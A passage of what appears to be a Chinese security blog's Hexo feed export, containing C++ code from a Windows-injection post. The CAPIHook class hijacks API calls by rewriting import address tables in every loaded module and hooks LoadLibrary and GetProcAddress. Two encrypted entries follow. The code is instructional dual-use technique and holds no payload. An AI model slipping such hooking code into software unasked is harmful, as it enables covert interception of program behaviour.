如果进程名一致，返回进程id</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">wcscmp</span>(stcPe32.szExeFile, szExeName))</span><br><span class="line"><span class="keyword">return</span> stcPe32.th32ProcessID;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查找下一个进程</span></span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hSnapshot, &amp;stcPe32));</span><br><span class="line"><span class="comment">//关闭快照句柄</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(hSnapshot);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="CAPIHook函数封装"><a href="#CAPIHook函数封装" class="headerlink" title="CAPIHook函数封装"></a>CAPIHook函数封装</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __APIHOOK_H__</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __APIHOOK_H__</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CAPIHook</span> </span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">       <span class="built_in">CAPIHook</span>(LPSTR  pszModName, LPSTR pszFuncName,</span><br><span class="line">        PROC pfnHook, BOOL bExcludeAPIHookMod=TRUE);</span><br><span class="line">       <span class="keyword">virtual</span> ~<span class="built_in">CAPIHook</span>();</span><br><span class="line">       <span class="function"><span class="keyword">operator</span> <span class="title">PROC</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> m_pfnOrig;&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"></span><br><span class="line">       LPSTR m_pszModName;        <span class="comment">//导出要HOOK函数的模块的名字</span></span><br><span class="line">       LPSTR m_pszFuncName;  <span class="comment">//要HOOK的函数的名字</span></span><br><span class="line">       PROC m_pfnOrig;                  <span class="comment">//原API函数地址</span></span><br><span class="line">       PROC m_pfnHook;                <span class="comment">//HOOK后函数的地址</span></span><br><span class="line">       BOOL m_bExcludeAPIHookMod; <span class="comment">//是否将HOOK API的模块本身排除在外</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">       <span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">ReplaceIATEntryInAllMods</span><span class="params">(LPSTR pszExportMod, PROC pfnCurrent,PROC pfnNew, BOOL bExcludeAPIHookMod)</span></span>;</span><br><span class="line">       <span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">ReplaceIATEntryInOneMod</span><span class="params">(LPSTR pszExportMod, PROC pfnCurrent,PROC pfnNew, HMODULE hModCaller)</span></span>;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//下面的代码用来解决其他模块动态加载DLL的问题</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"></span><br><span class="line">       <span class="comment">//这两个指针用来将所有的CAPIHook对象连在一起</span></span><br><span class="line">       <span class="type">static</span> CAPIHook *sm_pHeader;</span><br><span class="line">       CAPIHook *m_pNext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"></span><br><span class="line">       <span class="comment">//当一个新的DLL被加载时，调用此函数</span></span><br><span class="line">       <span class="function"><span class="type">static</span> <span class="type">void</span> WINAPI <span class="title">HookNewlyLoadedModule</span><span class="params">(HMODULE hModule, DWORD dwFlags)</span></span>;</span><br><span class="line">       <span class="comment">//用来跟踪当前进程加载新的DLL</span></span><br><span class="line">       <span class="function"><span class="type">static</span> HMODULE WINAPI <span class="title">LoadLibraryA</span><span class="params">(PCSTR pszModulePath)</span></span>;</span><br><span class="line">       <span class="function"><span class="type">static</span> HMODULE WINAPI <span class="title">LoadLibraryW</span><span class="params">(PCWSTR pszModulePath)</span></span>;</span><br><span class="line">       <span class="function"><span class="type">static</span> HMODULE WINAPI <span class="title">LoadLibraryExA</span><span class="params">(PCSTR pszModulePath, HANDLE hFile, DWORD dwFlags)</span></span>;</span><br><span class="line">       <span class="function"><span class="type">static</span> HMODULE WINAPI <span class="title">LoadLibraryExW</span><span class="params">(PCWSTR pszModulePath, HANDLE hFile, DWORD dwFlags)</span></span>;</span><br><span class="line">       <span class="comment">//如果请求已HOOK的API函数，则返回用户自定义函数的地址</span></span><br><span class="line">       <span class="function"><span class="type">static</span> FARPROC WINAPI <span class="title">GetProcAddress</span><span class="params">(HMODULE hModule, PCSTR pszProcName)</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">       <span class="comment">//自动对这些函数进行挂钩</span></span><br><span class="line">       <span class="type">static</span> CAPIHook sm_LoadLibraryA;</span><br><span class="line">       <span class="type">static</span> CAPIHook sm_LoadLibraryW;</span><br><span class="line">       <span class="type">static</span> CAPIHook sm_LoadLibraryExA;</span><br><span class="line">       <span class="type">static</span> CAPIHook sm_LoadLibraryExW;</span><br><span class="line">       <span class="type">static</span> CAPIHook sm_GetProcAddress;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">========================APIHook.cpp========================</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;APIHook.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Tlhelp32.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ImageHlp.h&gt;</span>  <span class="comment">//为了调用ImageDirectoryEntryToData函数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ImageHlp&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//CAPIHook对象链表的头指针</span></span><br><span class="line">CAPIHook *CAPIHook::sm_pHeader = <span class="literal">NULL</span>;</span><br><span class="line">CAPIHook::<span class="built_in">CAPIHook</span>(LPSTR pszModName, LPSTR pszFuncName,PROC pfnHook, BOOL bExcludeAPIHookMod<span class="comment">/* =TRUE */</span>)</span><br><span class="line">&#123;</span><br><span class="line">       <span class="comment">//保存这个Hook函数的信息</span></span><br><span class="line">       m_bExcludeAPIHookMod = bExcludeAPIHookMod;</span><br><span class="line">       m_pszModName = pszModName;</span><br><span class="line">       m_pszFuncName = pszFuncName;</span><br><span class="line">       m_pfnHook = pfnHook;</span><br><span class="line">       m_pfnOrig = ::<span class="built_in">GetProcAddress</span>(::<span class="built_in">GetModuleHandle</span>(pszModName), pszFuncName);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//将此对象添加到链表中</span></span><br><span class="line">       m_pNext = sm_pHeader;</span><br><span class="line">       sm_pHeader = <span class="keyword">this</span>;</span><br><span class="line">       <span class="comment">//在所有当前已加载的模块中HOOK这个函数</span></span><br><span class="line">       <span class="built_in">ReplaceIATEntryInAllMods</span>(m_pszModName, m_pfnOrig, m_pfnHook, bExcludeAPIHookMod);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">CAPIHook::~<span class="built_in">CAPIHook</span>()</span><br><span class="line">&#123;</span><br><span class="line">       <span class="comment">//取消对所有模块中函数的HOOK</span></span><br><span class="line">       <span class="built_in">ReplaceIATEntryInAllMods</span>(m_pszModName, m_pfnHook, m_pfnOrig,  m_bExcludeAPIHookMod);</span><br><span class="line">       CAPIHook *p = sm_pHeader;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//从链表中移除此对象</span></span><br><span class="line">       <span class="keyword">if</span>(p == <span class="keyword">this</span>)</span><br><span class="line">       &#123;</span><br><span class="line">              sm_pHeader = p-&gt;m_pNext;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">       &#123;</span><br><span class="line">              <span class="keyword">while</span>(p != <span class="literal">NULL</span>)</span><br><span class="line">              &#123;</span><br><span class="line">                     <span class="keyword">if</span>(p-&gt;m_pNext == <span class="keyword">this</span>)</span><br><span class="line">                     &#123;</span><br><span class="line">                            p-&gt;m_pNext = <span class="keyword">this</span>-&gt;m_pNext;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                     &#125;</span><br><span class="line">                     p = p-&gt;m_pNext;</span><br><span class="line">              &#125;</span><br><span class="line">       &#125;     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CAPIHook::ReplaceIATEntryInOneMod</span><span class="params">(LPSTR pszExportMod, PROC pfnCurrent, PROC pfnNew, HMODULE hModCaller)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       <span class="comment">//取得模块的导入表(import descriptor)的首地址</span></span><br><span class="line">       <span class="comment">//ImageDirectoryEntryToData函数可以返回导入表地址</span></span><br><span class="line">       ULONG ulSize;</span><br><span class="line">       PIMAGE_IMPORT_DESCRIPTOR pImportDesc =(PIMAGE_IMPORT_DESCRIPTOR)::<span class="built_in">ImageDirectoryEntryToData</span>(hModCaller, TRUE,IMAGE_DIRECTORY_ENTRY_IMPORT, &amp;ulSize);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(pImportDesc == <span class="literal">NULL</span>)      <span class="comment">//这个模块没有导入表项</span></span><br><span class="line">              <span class="keyword">return</span>;  </span><br><span class="line"></span><br><span class="line">       <span class="comment">//查找包含pszExportMod模块中函数导入信息的导入表项</span></span><br><span class="line">       <span class="keyword">while</span>(pImportDesc-&gt;Name != <span class="number">0</span>)</span><br><span class="line">       &#123;</span><br><span class="line">              LPSTR pszMod = (LPSTR)((DWORD)hModCaller + pImportDesc-&gt;Name);</span><br><span class="line">              <span class="keyword">if</span> (<span class="built_in">lstrcmpi</span>(pszMod, pszExportMod) == <span class="number">0</span>)    </span><br><span class="line">              &#123;</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              pImportDesc++;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (pImportDesc-&gt;Name == <span class="number">0</span>)    <span class="comment">//hModCaller模块没有从pszExportMod模块导入任何函数</span></span><br><span class="line">       &#123;</span><br><span class="line">              <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//取得调用者的导入地址表(import address table, IAT)</span></span><br><span class="line">       PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)(pImportDesc-&gt;FirstThunk +  (DWORD)hModCaller);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//查找我们要HOOK的函数，将它的地址用新函数的地址替换掉</span></span><br><span class="line">       <span class="keyword">while</span> (pThunk-&gt;u1.Function)</span><br><span class="line">       &#123;</span><br><span class="line">              <span class="comment">//lpAddr指向的内存保存了函数的地址</span></span><br><span class="line">              PDWORD lpAddr = (PDWORD)&amp;(pThunk-&gt;u1.Function);</span><br><span class="line">              <span class="keyword">if</span> (*lpAddr == (DWORD)pfnCurrent)</span><br><span class="line">              &#123;</span><br><span class="line">                     <span class="comment">//修改页的保护属性</span></span><br><span class="line">                     DWORD dwOldProtect;</span><br><span class="line">                     MEMORY_BASIC_INFORMATION mbi;</span><br><span class="line">                     ::<span class="built_in">VirtualQuery</span>(lpAddr, &amp;mbi, <span class="built_in">sizeof</span>(mbi));</span><br><span class="line">                     ::<span class="built_in">VirtualProtect</span>(lpAddr, <span class="built_in">sizeof</span>(DWORD), PAGE_READWRITE, &amp;dwOldProtect);</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">                     <span class="comment">//修改内存地址，相当于&quot;lpAddr = (DWORD)pfnNew;&quot;</span></span><br><span class="line">                     ::<span class="built_in">WriteProcessMemory</span>(::<span class="built_in">GetCurrentProcess</span>(), lpAddr,  &amp;pfnNew, <span class="built_in">sizeof</span>(DWORD), <span class="literal">NULL</span>);</span><br><span class="line">                     ::<span class="built_in">VirtualProtect</span>(lpAddr, <span class="built_in">sizeof</span>(DWORD), dwOldProtect, <span class="number">0</span>);</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              pThunk++;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CAPIHook::ReplaceIATEntryInAllMods</span><span class="params">(LPSTR pszExportMod, PROC pfnCurrent, PROC pfnNew, BOOL bExcludeAPIHookMod)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       <span class="comment">//取得当前模块的句柄</span></span><br><span class="line">       HMODULE hModThis = <span class="literal">NULL</span>;</span><br><span class="line">       <span class="keyword">if</span>(bExcludeAPIHookMod)</span><br><span class="line">       &#123;</span><br><span class="line">              MEMORY_BASIC_INFORMATION mbi;</span><br><span class="line">              <span class="keyword">if</span>(::<span class="built_in">VirtualQuery</span>(ReplaceIATEntryInAllMods, &amp;mbi, <span class="built_in">sizeof</span>(mbi)) != <span class="number">0</span>)</span><br><span class="line">                     hModThis = (HMODULE)mbi.AllocationBase;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//取得本进程的模块列表</span></span><br><span class="line">       HANDLE hSnap = ::<span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPMODULE, ::<span class="built_in">GetCurrentProcessId</span>());</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">       <span class="comment">//遍历所有模块，分别对它们调用ReplaceIATEntryInOnMod函数，修改导入地址表</span></span><br><span class="line">       MODULEENTRY32 me = &#123;<span class="built_in">sizeof</span>(MODULEENTRY32)&#125;;</span><br><span class="line">       BOOL bOK = ::<span class="built_in">Module32First</span>(hSnap, &amp;me);</span><br><span class="line">       <span class="keyword">while</span> (bOK)</span><br><span class="line">       &#123;</span><br><span class="line">              <span class="comment">//注意，我们不HOOK当前模块的函数</span></span><br><span class="line">              <span class="keyword">if</span> (me.hModule != hModThis)</span><br><span class="line">              &#123;</span><br><span class="line">                    <span class="built_in">ReplaceIATEntryInOneMod</span>(pszExportMod, pfnCurrent, pfnNew, me.hModule);</span><br><span class="line">              &#125;</span><br><span class="line"></span><br><span class="line">              bOK = ::<span class="built_in">Module32Next</span>(hSnap, &amp;me);</span><br><span class="line">       &#125;</span><br><span class="line">       ::<span class="built_in">CloseHandle</span>(hSnap);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">//挂钩LoadLibrary和GetProcAddress函数，以便在这些函数被调用以后，挂钩的函数也能够被正确的处理</span></span><br><span class="line"><span class="function">CAPIHook <span class="title">CAPIHook::sm_LoadLibraryA</span><span class="params">(<span class="string">&quot;Kernel32.dll&quot;</span>, <span class="string">&quot;LoadLibraryA&quot;</span>, (PROC)CAPIHook::LoadLibraryA, TRUE)</span></span>;</span><br><span class="line"><span class="function">CAPIHook <span class="title">CAPIHook::sm_LoadLibraryW</span><span class="params">(<span class="string">&quot;Kernel32.dll&quot;</span>, <span class="string">&quot;LoadLibraryW&quot;</span>, (PROC)CAPIHook::LoadLibraryW, TRUE)</span></span>;</span><br><span class="line"><span class="function">CAPIHook <span class="title">CAPIHook::sm_LoadLibraryExA</span><span class="params">(<span class="string">&quot;Kernel32.dll&quot;</span>, <span class="string">&quot;LoadLibraryExA&quot;</span>,(PROC)CAPIHook::LoadLibraryExA, TRUE)</span></span>;</span><br><span class="line"><span class="function">CAPIHook <span class="title">CAPIHook::sm_LoadLibraryExW</span><span class="params">(<span class="string">&quot;Kernel32.dll&quot;</span>, <span class="string">&quot;LoadLibraryExW&quot;</span>,(PROC)CAPIHook::LoadLibraryExW, TRUE)</span></span>;</span><br><span class="line"><span class="function">CAPIHook <span class="title">CAPIHook::sm_GetProcAddress</span><span class="params">(<span class="string">&quot;Kernel32.dll&quot;</span>, <span class="string">&quot;GetProcAddress&quot;</span>, (PROC)CAPIHook::GetProcAddress, TRUE)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> WINAPI <span class="title">CAPIHook::HookNewlyLoadedModule</span><span class="params">(HMODULE hModule, DWORD dwFlags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       <span class="comment">//如果一个新的模块被加载，挂钩各CAPIHook对象要求的API函数</span></span><br><span class="line">       <span class="keyword">if</span>((hModule != <span class="literal">NULL</span>) &amp;&amp; ((dwFlags&amp;LOAD_LIBRARY_AS_DATAFILE) == <span class="number">0</span>))</span><br><span class="line">       &#123;</span><br><span class="line">              CAPIHook *p = sm_pHeader;</span><br><span class="line">              <span class="keyword">while</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">              &#123;</span><br><span class="line">                     <span class="built_in">ReplaceIATEntryInOneMod</span>(p-&gt;m_pszModName, p-&gt;m_pfnOrig, p-&gt;m_pfnHook, hModule);</span><br><span class="line">                     p = p-&gt;m_pNext;</span><br><span class="line">              &#125;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function">HMODULE WINAPI <span class="title">CAPIHook::LoadLibraryA</span><span class="params">(PCSTR pszModulePath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       HMODULE hModule = ::<span class="built_in">LoadLibraryA</span>(pszModulePath);</span><br><span class="line">       <span class="built_in">HookNewlyLoadedModule</span>(hModule, <span class="number">0</span>);</span><br><span class="line">       <span class="keyword">return</span> hModule;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function">HMODULE WINAPI <span class="title">CAPIHook::LoadLibraryW</span><span class="params">(PCWSTR pszModulePath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       HMODULE hModule = ::<span class="built_in">LoadLibraryW</span>(pszModulePath);</span><br><span class="line">       <span class="built_in">HookNewlyLoadedModule</span>(hModule, <span class="number">0</span>);</span><br><span class="line">       <span class="keyword">return</span> hModule;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function">HMODULE WINAPI <span class="title">CAPIHook::LoadLibraryExA</span><span class="params">(PCSTR pszModulePath, HANDLE hFile, DWORD dwFlags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       HMODULE hModule = ::<span class="built_in">LoadLibraryExA</span>(pszModulePath, hFile, dwFlags);</span><br><span class="line">       <span class="built_in">HookNewlyLoadedModule</span>(hModule, dwFlags);</span><br><span class="line">       <span class="keyword">return</span> hModule;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function">HMODULE WINAPI <span class="title">CAPIHook::LoadLibraryExW</span><span class="params">(PCWSTR pszModulePath, HANDLE hFile, DWORD dwFlags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       HMODULE hModule = ::<span class="built_in">LoadLibraryExW</span>(pszModulePath, hFile, dwFlags);</span><br><span class="line">       <span class="built_in">HookNewlyLoadedModule</span>(hModule, dwFlags);</span><br><span class="line">       <span class="keyword">return</span> hModule;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function">FARPROC WINAPI <span class="title">CAPIHook::GetProcAddress</span><span class="params">(HMODULE hModule, PCSTR pszProcName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       <span class="comment">//得到函数的真实地址</span></span><br><span class="line">       FARPROC pfn = ::<span class="built_in">GetProcAddress</span>(hModule, pszProcName);</span><br><span class="line">       <span class="comment">//看它是否我们要HOOK的函数</span></span><br><span class="line">       CAPIHook *p = sm_pHeader;</span><br><span class="line">       <span class="keyword">while</span>(p != <span class="literal">NULL</span>)</span><br><span class="line">       &#123;</span><br><span class="line">              <span class="keyword">if</span> (p-&gt;m_pfnOrig == pfn)</span><br><span class="line">              &#123;</span><br><span class="line">                     pfn = p-&gt;m_pfnHook;</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              p = p-&gt;m_pNext;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> pfn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java Web Servlet教程</title>
      <link href="/2020/01/16/Java-Web-Servlet%E6%95%99%E7%A8%8B/"/>
      <url>/2020/01/16/Java-Web-Servlet%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="31b5bf6b3d0f8c163e45190cad4958846db04bb2268f78c0cdc5c11625b4d7e8">b3c9a99c0ccdca4a7128185684909d47c7b4109eddc3e1e95fa17bdb523e92f7e3d725bc40ba2620ebb628e6bf489261e551f73d6088cdb4601819865828490d30690b0679cd558fe656d468fd25ae5fb696ccd78adde1b00fb9ca0dc824c3f944e38de7fbab71f323e47bac284c573b64c7bf9edafa1319da44a8baabbffcf3225f21b5f5bc5325093c8c7de9e00464d80a9b5e67d5bec237b1e0984d580682fa32d11e3a1f0191edbcabfa637de6360335c8de628ca1e7a85faa980d03c546651bdef4fc1a84fa1261dcfce5947231</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入正确的密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> JavaWeb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用魔法打败魔法</title>
      <link href="/2019/11/21/%E4%BD%BF%E7%94%A8%E9%AD%94%E6%B3%95%E6%89%93%E8%B4%A5%E9%AD%94%E6%B3%95/"/>
      <url>/2019/11/21/%E4%BD%BF%E7%94%A8%E9%AD%94%E6%B3%95%E6%89%93%E8%B4%A5%E9%AD%94%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="d2a5e49b2aee3d023454ccb2173c60da7ffa205b5db7822e8b92eaa5c0c16caf">b3c9a99c0ccdca4a7128185684909d47c7b4109eddc3e1e95fa17bdb523e92f70ed377555fc79c6b7c46ea7d4abba8ce8e115bafe122509f0900d83dd4c4909a45e23fd2fd1c15f6c46505ec979ba42b6470ff617392429291550dff707f7c3ad5215f7e807dd5616be68277f1a1f47e4b3f7fc29c1c3d299ac591471f0e1d743f10c6aaf6806e067941b4bbf33d4f761353d0b5bdc150cc9a145a036a438620865e64b78e288adb90da3c3030a8a8134ffdc4cf886a307e53d73755f649d9b32c997339808f90ebcc2840574567d310</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">旅行者，该文章需要填写密码，请联系管理员！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
